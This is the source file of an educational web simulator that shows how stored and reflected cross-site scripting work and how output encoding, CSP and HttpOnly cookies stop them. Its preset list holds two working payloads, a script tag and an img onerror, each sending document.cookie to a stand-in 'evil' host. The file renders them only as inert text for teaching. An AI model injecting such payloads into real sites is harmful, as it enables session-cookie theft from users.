import { useMemo, useState } from "react";
import { Bug, Globe, ShieldCheck, ShieldAlert, Cookie, RefreshCw, MessageSquare } from "lucide-react";
import SimulatorLayout, { FooterControl } from "../../components/SimulatorLayout";
import { evaluateXss, type XssDefenses } from "../../lib/xss";

const LAYER_COLOR = "#f97316";
const SESSION_COOKIE = "session=9f2a1c8b4d";

const PRESETS = [
  { label: "Script tag", value: "<script>fetch('//evil/?c='+document.cookie)</script>" },
  { label: "Image onerror", value: "<img src=x onerror=\"fetch('//evil/?c='+document.cookie)\">" },
  { label: "Benign comment", value: "Great write-up, thanks for sharing!" },
];

const BENIGN_FEED = [
  { user: "jordan", text: "First! Loved this." },
  { user: "sam", text: "Bookmarked for later 👍" },
];

export default function XSSSimulator() {
  const [mode, setMode] = useState<"Stored" | "Reflected">("Stored");
  const [payload, setPayload] = useState(PRESETS[0].value);
  const [defenses, setDefenses] = useState<XssDefenses>({ sanitize: false, csp: false, httpOnly: false });

  const outcome = useMemo(() => evaluateXss(payload, defenses), [payload, defenses]);

  const toggle = (key: keyof XssDefenses) => setDefenses((d) => ({ ...d, [key]: !d[key] }));

  const reset = () => {
    setMode("Stored");
    setPayload(PRESETS[0].value);
    setDefenses({ sanitize: false, csp: false, httpOnly: false });
  };

  const footerControls: FooterControl[] = [
    {
      key: "mode",
      type: "segmented",
      options: ["Stored", "Reflected"],
      value: mode,
      onChange: (v) => setMode(v as "Stored" | "Reflected"),
    },
    { key: "sp", type: "spacer" },
    {
      key: "reset",
      type: "button",
      label: "Reset",
      variant: "secondary",
      icon: <RefreshCw size={12} />,
      onClick: reset,
    },
  ];

  const sidebar = (
    <div className="flex flex-col h-full overflow-y-auto logs-scroll p-3 gap-3">
      <div className="glass-panel border border-white/10 bg-[#141b24] p-3 rounded-xl shrink-0">
        <div className="text-[10px] uppercase tracking-widest font-bold mb-2" style={{ color: LAYER_COLOR }}>
          Stored vs. Reflected
        </div>
        <p className="text-[11px] text-slate-300 leading-relaxed">
          <span className="text-slate-200 font-bold">Stored</span> XSS is saved on the server (e.g. a comment)
          and runs for <span className="font-bold">every</span> visitor. <span className="text-slate-200 font-bold">Reflected</span>{" "}
          XSS lives in a crafted URL and only fires when a victim clicks the link. DOM-based XSS is a third kind,
          where client-side JS writes untrusted data into the page.
        </p>
      </div>
      <div className="glass-panel border border-green-500/20 bg-green-500/5 p-3 rounded-xl shrink-0">
        <div className="flex items-center gap-1.5 mb-1.5">
          <ShieldCheck size={12} className="text-green-400" />
          <span className="text-[10px] uppercase tracking-widest font-bold text-green-400">Defenses</span>
        </div>
        <ul className="text-[11px] text-slate-300 leading-relaxed list-disc list-inside flex flex-col gap-1">
          <li><span className="font-bold">Output encoding</span> renders input as text, not HTML.</li>
          <li><span className="font-bold">CSP</span> blocks inline scripts from running at all.</li>
          <li><span className="font-bold">HttpOnly</span> hides the cookie from JavaScript.</li>
        </ul>
      </div>
      <div className="glass-panel border border-white/10 bg-[#141b24] p-3 rounded-xl shrink-0">
        <div className="text-[9px] uppercase tracking-widest text-slate-500 leading-relaxed">
          ⓘ This is a simulation — payloads are shown and their effect is depicted, never actually executed in
          your browser.
        </div>
      </div>
    </div>
  );

  const verdict = outcome.executes
    ? { label: outcome.cookieStolen ? "Cookie Stolen" : "Script Ran", color: "#ef4444" }
    : outcome.isScript
      ? { label: `Blocked: ${outcome.blockedBy}`, color: "#22c55e" }
      : { label: "Harmless", color: "#64748b" };

  return (
    <SimulatorLayout
      title="Cross-Site Scripting (XSS)"
      subtitle="When User Input Becomes Code"
      layerBadge="SEC"
      layerColor={LAYER_COLOR}
      footerControls={footerControls}
      sidebar={sidebar}
    >
      <div className="h-full flex flex-col p-4 select-none overflow-y-auto logs-scroll text-slate-400 bg-[#0a0e14]">
        {/* Status metrics */}
        <div className="grid grid-cols-3 gap-3 shrink-0 mb-3">
          {[
            { label: "MODE", value: mode, color: LAYER_COLOR },
            { label: "PAYLOAD", value: outcome.isScript ? "Active content" : "Plain text", color: outcome.isScript ? "#ef4444" : "#64748b" },
            { label: "RESULT", value: verdict.label, color: verdict.color },
          ].map((item) => (
            <div key={item.label} className="glass-panel border border-white/5 bg-[#141b24] p-3 rounded-xl shadow-lg flex flex-col items-center">
              <div className="text-[10px] uppercase tracking-widest mb-1">{item.label}</div>
              <div className="font-mono font-bold text-sm text-center" style={{ color: item.color }}>{item.value}</div>
            </div>
          ))}
        </div>

        {/* Defenses */}
        <div className="flex flex-wrap items-center gap-2 shrink-0 mb-3">
          <span className="text-[10px] uppercase tracking-widest text-slate-500 mr-1">Defenses:</span>
          {([
            { key: "sanitize", label: "Output Encoding" },
            { key: "csp", label: "Content Security Policy" },
            { key: "httpOnly", label: "HttpOnly Cookie" },
          ] as const).map((d) => {
            const on = defenses[d.key];
            return (
              <button
                key={d.key}
                onClick={() => toggle(d.key)}
                className="px-3 py-1.5 rounded-full border text-[11px] font-semibold uppercase tracking-widest transition-colors"
                style={{
                  borderColor: on ? "#22c55e" : "rgba(255,255,255,0.1)",
                  background: on ? "#22c55e15" : "transparent",
                  color: on ? "#22c55e" : "#64748b",
                }}
              >
                {on ? "✓ " : "✕ "}
                {d.label}
              </button>
            );
          })}
        </div>

        <div className="grid grid-cols-2 gap-4">
          {/* Attacker */}
          <div className="glass-panel border border-white/5 bg-[#141b24] p-4 rounded-xl flex flex-col gap-3">
            <div className="flex items-center gap-2 text-white border-b border-white/5 pb-2">
              <Bug size={15} className="text-red-400" />
              <span className="text-[11px] uppercase tracking-widest font-bold">Attacker · {mode === "Stored" ? "Post a comment" : "Craft a link"}</span>
            </div>
            <textarea
              value={payload}
              onChange={(e) => setPayload(e.target.value)}
              rows={3}
              className="bg-[#0c1219] border border-white/10 focus:border-[#f97316] rounded p-2 text-white font-mono text-[12px] outline-none transition-colors resize-none break-all"
            />
            <div className="flex flex-wrap gap-2">
              {PRESETS.map((p) => (
                <button
                  key={p.label}
                  onClick={() => setPayload(p.value)}
                  className="px-2.5 py-1 rounded border border-white/8 bg-[#0c1219] text-[10px] text-slate-300 hover:border-white/20 transition-colors"
                >
                  {p.label}
                </button>
              ))}
            </div>
            {mode === "Reflected" && (
              <div className="rounded border border-white/8 bg-[#0c1219] p-2">
                <div className="text-[8px] uppercase tracking-widest text-slate-500 mb-1">Malicious link sent to victim</div>
                <div className="text-[10px] font-mono text-cyan-400/80 break-all">
                  https://blog.example/search?q={encodeURIComponent(payload)}
                </div>
              </div>
            )}
          </div>

          {/* Victim browser */}
          <div className="glass-panel border border-white/5 bg-[#141b24] rounded-xl overflow-hidden flex flex-col">
            {/* Browser chrome */}
            <div className="flex items-center gap-2 px-3 py-2 bg-[#0c1219] border-b border-white/5">
              <div className="flex gap-1">
                <span className="w-2.5 h-2.5 rounded-full bg-red-500/60" />
                <span className="w-2.5 h-2.5 rounded-full bg-amber-500/60" />
                <span className="w-2.5 h-2.5 rounded-full bg-green-500/60" />
              </div>
              <div className="flex-1 flex items-center gap-1.5 bg-[#141b24] rounded px-2 py-1">
                <Globe size={11} className="text-slate-500" />
                <span className="text-[10px] font-mono text-slate-400 truncate">
                  {mode === "Stored" ? "blog.example/post/42#comments" : "blog.example/search?q=…"}
                </span>
              </div>
            </div>

            {/* Page content */}
            <div className="p-3 flex flex-col gap-2 flex-1">
              <div className="flex items-center gap-1.5 text-[10px] uppercase tracking-widest text-slate-500">
                <MessageSquare size={11} /> {mode === "Stored" ? "Comments" : "Search results for your query"}
              </div>

              {mode === "Stored" &&
                BENIGN_FEED.map((c) => (
                  <div key={c.user} className="rounded-lg bg-[#0c1219] border border-white/5 p-2">
                    <div className="text-[9px] font-mono text-slate-500">{c.user}</div>
                    <div className="text-[12px] text-slate-300">{c.text}</div>
                  </div>
                ))}

              {/* The attacker's content, always rendered as TEXT (never injected as HTML) */}
              <div
                className="rounded-lg border p-2"
                style={{
                  borderColor: outcome.executes ? "#ef4444" : outcome.isScript ? "#22c55e40" : "rgba(255,255,255,0.05)",
                  background: outcome.executes ? "#ef44440d" : "#0c1219",
                }}
              >
                <div className="text-[9px] font-mono text-slate-500">{mode === "Stored" ? "attacker" : "reflected input"}</div>
                <div className="text-[12px] font-mono break-all" style={{ color: defenses.sanitize ? "#86efac" : "#cbd5e1" }}>
                  {outcome.rendered}
                </div>
                {defenses.sanitize && outcome.isScript && (
                  <div className="text-[9px] text-green-400 mt-1">Rendered as inert, escaped text.</div>
                )}
              </div>

              {/* Depicted effect (simulated, not executed) */}
              {outcome.executes ? (
                <div className="rounded-lg border border-red-500/40 bg-red-500/10 p-2.5 mt-1">
                  <div className="flex items-center gap-1.5 text-red-400 text-[11px] font-bold uppercase tracking-widest">
                    <ShieldAlert size={13} /> Injected script executed
                  </div>
                  {outcome.cookieStolen ? (
                    <div className="flex items-start gap-1.5 mt-1.5 text-[11px] text-red-300 font-mono">
                      <Cookie size={12} className="mt-0.5 shrink-0" />
                      <span>document.cookie → "{SESSION_COOKIE}" exfiltrated to evil.com</span>
                    </div>
                  ) : (
                    <div className="text-[11px] text-amber-300 mt-1.5">
                      Script ran, but <span className="font-bold">HttpOnly</span> hid the cookie from JavaScript.
                    </div>
                  )}
                </div>
              ) : outcome.isScript ? (
                <div className="rounded-lg border border-green-500/40 bg-green-500/10 p-2.5 mt-1 flex items-center gap-1.5 text-green-400 text-[11px] font-bold">
                  <ShieldCheck size={13} /> Attack blocked by {outcome.blockedBy}
                </div>
              ) : (
                <div className="rounded-lg border border-white/5 bg-[#0c1219] p-2.5 mt-1 text-[11px] text-slate-500">
                  No active content — nothing to execute.
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </SimulatorLayout>
  );
}
